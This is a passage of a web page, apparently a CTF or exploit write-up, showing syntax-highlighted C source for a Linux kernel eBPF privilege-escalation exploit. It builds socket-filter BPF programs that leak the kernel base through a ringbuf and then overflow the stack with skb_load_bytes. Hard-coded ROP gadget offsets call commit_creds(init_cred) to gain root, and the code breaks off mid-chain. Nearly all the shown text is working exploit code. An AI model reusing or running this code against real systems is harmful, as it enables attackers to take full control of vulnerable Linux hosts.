class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;bpf_insn.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="hljs-keyword">sizeof</span>(*attr));<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_create</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key_size,</span><br><span class="hljs-params">               <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_entries, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_flags)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_type = map_type,<br>                .key_size = key_size,<br>                .value_size = value_size,<br>                .max_entries = max_entries,<br>                .map_flags = map_flags,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key, <span class="hljs-type">void</span>* value)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>                .value = (<span class="hljs-type">uint64_t</span>)value,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_freeze</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_FREEZE, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_update_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* value)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>                .value = (<span class="hljs-type">uint64_t</span>)value,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_delete_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_get_next_key</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key, <span class="hljs-type">void</span>* next_key)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>                .next_key = (<span class="hljs-type">uint64_t</span>)next_key,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">uint32_t</span><br><span class="hljs-title function_">bpf_map_get_info_by_fd</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_info</span> <span class="hljs-title">info</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .info.bpf_fd = map_fd,<br>                .info.info_len = <span class="hljs-keyword">sizeof</span>(info),<br>                .info.info = (<span class="hljs-type">uint64_t</span>)&amp;info,<br><br>        &#125;;<br>        bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);<br>        <span class="hljs-keyword">return</span> info.btf_id;<br>&#125;<br><br><span class="hljs-type">int</span> sockets[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> map_fd, exp_fd, ringbuf_map_fd, leak_ringbuf_map_fd;<br><span class="hljs-type">int</span> leak_map_fd;<br><span class="hljs-type">int</span> leak_prog_fd, hack_prog_fd;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">hack_prog</span>[] =</span> &#123;<br>        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),    <span class="hljs-comment">// reg9 = ctx</span><br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        <span class="hljs-comment">// STEP2: rop</span><br>        <span class="hljs-comment">// *(int *)(fp - 4) = 0</span><br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),   <span class="hljs-comment">// reg2 = fp</span><br>        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, <span class="hljs-number">-4</span>),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>),  <span class="hljs-comment">// reg2 = fp - 4</span><br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">4</span>),    <span class="hljs-comment">// reg1 = exp_fd(4)</span><br><br>        <span class="hljs-comment">// map_lookup_elem(map_fd(4), fp - 4)</span><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),  <br><br>        <span class="hljs-comment">// reg8 = ptr_to_value(8)</span><br>        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, <span class="hljs-number">8</span>),<br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        <span class="hljs-comment">// *(int *)(fp - 4) = 0</span><br>        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, <span class="hljs-number">-4</span>),<br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">3</span>),    <span class="hljs-comment">// reg1 = map_fd(3)</span><br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>),  <span class="hljs-comment">// reg2 = fp - 4</span><br><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),<br><br>        <span class="hljs-comment">// reg7 = ptr_to_value(&#x27;512&#x27;)</span><br>        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, <span class="hljs-number">8</span>),<br><br>        BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),<br>        BPF_MOV64_IMM(BPF_REG_2, <span class="hljs-number">8</span>),<br>        BPF_MOV64_IMM(BPF_REG_3, <span class="hljs-number">0</span>),<br>        BPF_MOV64_REG(BPF_REG_4, BPF_REG_8),<br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_strtol),<br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">4</span>),<br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>),  <span class="hljs-comment">// reg2 = fp - 4</span><br><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),<br><br>        <span class="hljs-comment">// reg8 = ptr_to_value(0x200)</span><br>        <span class="hljs-comment">// reg7 = value(0x200)</span><br>        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, <span class="hljs-number">8</span>),<br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, <span class="hljs-number">0</span>),<br><br>        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),<br>        BPF_MOV64_IMM(BPF_REG_2, <span class="hljs-number">0</span>),<br>        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="hljs-number">-8</span>),<br>        BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),<br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_skb_load_bytes),<br><br>        BPF_EXIT_INSN(),<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">leak_prog</span>[] =</span> &#123;<br>        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),    <span class="hljs-comment">// reg9 = ctx</span><br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        <span class="hljs-comment">// STEP1: leak</span><br>        <span class="hljs-comment">// *(int *)(fp - 4) = 0</span><br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),   <span class="hljs-comment">// reg2 = fp</span><br>        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, <span class="hljs-number">-4</span>),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>),  <span class="hljs-comment">// reg2 = fp - 4</span><br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">4</span>),    <span class="hljs-comment">// reg1 = exp_fd(4)</span><br><br>        <span class="hljs-comment">// map_lookup_elem(map_fd(4), fp - 4)</span><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),  <br><br>        <span class="hljs-comment">// reg8 = ptr_to_value(0x10000)</span><br>        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),<br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        <span class="hljs-comment">// *(int *)(fp - 4) = 0</span><br>        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, <span class="hljs-number">-4</span>),<br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">3</span>),    <span class="hljs-comment">// reg1 = map_fd(3)</span><br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>),  <span class="hljs-comment">// reg2 = fp - 4</span><br><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),<br><br>        <span class="hljs-comment">// reg7 = ptr_to_value(&#x27;256&#x27;)</span><br>        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),<br><br>        BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),<br>        BPF_MOV64_IMM(BPF_REG_2, <span class="hljs-number">8</span>),<br>        BPF_MOV64_IMM(BPF_REG_3, <span class="hljs-number">0</span>),<br>        BPF_MOV64_REG(BPF_REG_4, BPF_REG_8),<br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_strtol),<br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">4</span>),<br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>),  <span class="hljs-comment">// reg2 = fp - 4</span><br><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),<br><br>        <span class="hljs-comment">// reg8 = ptr_to_value(0x100)</span><br>        <span class="hljs-comment">// reg7 = value(0x100)</span><br>        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),<br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, <span class="hljs-number">0</span>),<br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">5</span>),<br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_7),<br>        BPF_MOV64_IMM(BPF_REG_3, <span class="hljs-number">0</span>),<br><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_ringbuf_reserve),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),<br><br>        <span class="hljs-comment">// reg6 = ptr_to_ringbuf(5)</span><br>        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),<br><br>        <span class="hljs-comment">// reg8 = kernel_base</span><br>        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, <span class="hljs-number">0x2ff8</span>+<span class="hljs-number">0x28</span>),<br>        BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, <span class="hljs-number">0x36b440</span>),<br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">7</span>),<br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br>        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, <span class="hljs-number">-8</span>),<br>        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, <span class="hljs-number">-16</span>),<br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-8</span>),<br>        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="hljs-number">-16</span>),<br>        BPF_MOV64_IMM(BPF_REG_4, <span class="hljs-number">0</span>),<br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_update_elem),<br><br>        BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),<br>        BPF_MOV64_IMM(BPF_REG_2, <span class="hljs-number">0</span>),<br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_ringbuf_submit),<br><br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        BPF_EXIT_INSN(),      <br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_LOG_SZ 0x20000</span><br><span class="hljs-type">char</span> bpf_log_buf[BPF_LOG_SZ] = &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">leak_attr</span> =</span> &#123;<br>    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,<br>    .insns = (<span class="hljs-type">uint64_t</span>) &amp;leak_prog,<br>    .insn_cnt = <span class="hljs-keyword">sizeof</span>(leak_prog) / <span class="hljs-keyword">sizeof</span>(leak_prog[<span class="hljs-number">0</span>]),<br>    .license = (<span class="hljs-type">uint64_t</span>) <span class="hljs-string">&quot;GPL&quot;</span>,<br>    .log_level = <span class="hljs-number">2</span>,<br>    .log_buf = (<span class="hljs-type">uint64_t</span>) bpf_log_buf,<br>    .log_size = BPF_LOG_SZ,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">hack_attr</span> =</span> &#123;<br>    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,<br>    .insns = (<span class="hljs-type">uint64_t</span>) &amp;hack_prog,<br>    .insn_cnt = <span class="hljs-keyword">sizeof</span>(hack_prog) / <span class="hljs-keyword">sizeof</span>(hack_prog[<span class="hljs-number">0</span>]),<br>    .license = (<span class="hljs-type">uint64_t</span>) <span class="hljs-string">&quot;GPL&quot;</span>,<br>    .log_level = <span class="hljs-number">2</span>,<br>    .log_buf = (<span class="hljs-type">uint64_t</span>) bpf_log_buf,<br>    .log_size = BPF_LOG_SZ,<br>&#125;;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>        setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>        setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br>        save_status();<br>        bind_core(<span class="hljs-number">0</span>);<br><br>        <span class="hljs-keyword">if</span>(!fork()) &#123;<br>                <span class="hljs-keyword">if</span>(!fork())<br>                        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        usleep(<span class="hljs-number">1000</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> buffer[<span class="hljs-number">0x200</span>/<span class="hljs-number">8</span>];<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAGIC_LEAK      0x114514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAGIC_HACK      0x233333</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigger</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_tmp)</span> &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">sk_buff</span> <span class="hljs-title">md</span> =</span> &#123;&#125;;<br><br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">test_run_attr</span> =</span> &#123;<br>                .test.prog_fd = fd_tmp,<br>                .test.data_size_in = <span class="hljs-number">0x300</span>,<br>                .test.data_in = (<span class="hljs-type">uint64_t</span>)&amp;buffer,<br>                .test.ctx_size_in = <span class="hljs-keyword">sizeof</span>(md),<br>                .test.ctx_in = (<span class="hljs-type">uint64_t</span>)&amp;md,<br>        &#125;;<br><br>        bpf(BPF_PROG_TEST_RUN, &amp;test_run_attr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leak</span><span class="hljs-params">()</span> &#123;<br><br>        prctl(PR_SET_NAME, <span class="hljs-string">&quot;Eurus&quot;</span>);<br><br>        map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, <span class="hljs-number">16</span>, <span class="hljs-number">1</span>, BPF_F_RDONLY_PROG);<br>        <span class="hljs-keyword">if</span> (map_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>);<br><br>        exp_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, <span class="hljs-number">16</span>, <span class="hljs-number">1</span>, BPF_F_RDONLY_PROG);<br>        <span class="hljs-keyword">if</span> (exp_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>);<br><br>        <span class="hljs-type">int</span> key = <span class="hljs-number">0</span>;<br>        buffer[<span class="hljs-number">0</span>] = <span class="hljs-number">0x10000</span>;<br>        buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">8</span>;<br>        bpf_map_update_elem(exp_fd, &amp;key, buffer);<br><br>        buffer[<span class="hljs-number">0</span>] = <span class="hljs-number">0x363532</span>;<br>        buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x323135</span>;<br>        bpf_map_update_elem(map_fd, &amp;key, buffer);<br><br>        bpf_map_freeze(exp_fd);<br>        bpf_map_freeze(map_fd);<br><br>        ringbuf_map_fd = bpf_map_create(BPF_MAP_TYPE_RINGBUF, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (ringbuf_map_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>);<br><br>        leak_ringbuf_map_fd = bpf_map_create(BPF_MAP_TYPE_RINGBUF, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (leak_ringbuf_map_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>);<br><br>        leak_map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (leak_map_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;map_fd: %d\n&quot;</span>, map_fd);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;exp_fd: %d\n&quot;</span>, exp_fd);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ringbuf_map_fd: %d\n&quot;</span>, ringbuf_map_fd);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_ringbuf_map_fd: %d\n&quot;</span>, leak_ringbuf_map_fd);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_map_fd: %d\n&quot;</span>, leak_map_fd);<br><br>        leak_prog_fd = bpf(BPF_PROG_LOAD, &amp;leak_attr);<br>        <span class="hljs-keyword">if</span> (leak_prog_fd &lt; <span class="hljs-number">0</span>) <span class="hljs-built_in">puts</span>(bpf_log_buf), perror(<span class="hljs-string">&quot;BPF_PROG_LOAD&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_PROG_LOAD&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_prog_fd: %d\n&quot;</span>, leak_prog_fd);<br><br>        <span class="hljs-comment">//puts(bpf_log_buf);</span><br>&#125;<br><br><span class="hljs-type">size_t</span> kernel_base;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET             0xe6d00</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED               0x248b080</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS            0x146b70</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET             0x1dc1a3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RETURN_USER_MODE        0x1400163</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VFORK                   0x104150</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hack</span><span class="hljs-params">()</span>&#123;<br>        hack_prog_fd = bpf(BPF_PROG_LOAD, &amp;hack_attr);<br>        <span class="hljs-keyword">if</span> (hack_prog_fd &lt; <span class="hljs-number">0</span>) <span class="hljs-built_in">puts</span>(bpf_log_buf), perror(<span class="hljs-string">&quot;BPF_PROG_LOAD&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_PROG_LOAD&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hack_prog_fd: %d\n&quot;</span>, hack_prog_fd);<br><br>        <span class="hljs-comment">//puts(bpf_log_buf);</span><br><br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">size_t</span> *p = (<span class="hljs-type">size_t</span> *)((<span class="hljs-type">size_t</span>)buffer + <span class="hljs-number">14</span>);<br>        p[i++] = <span 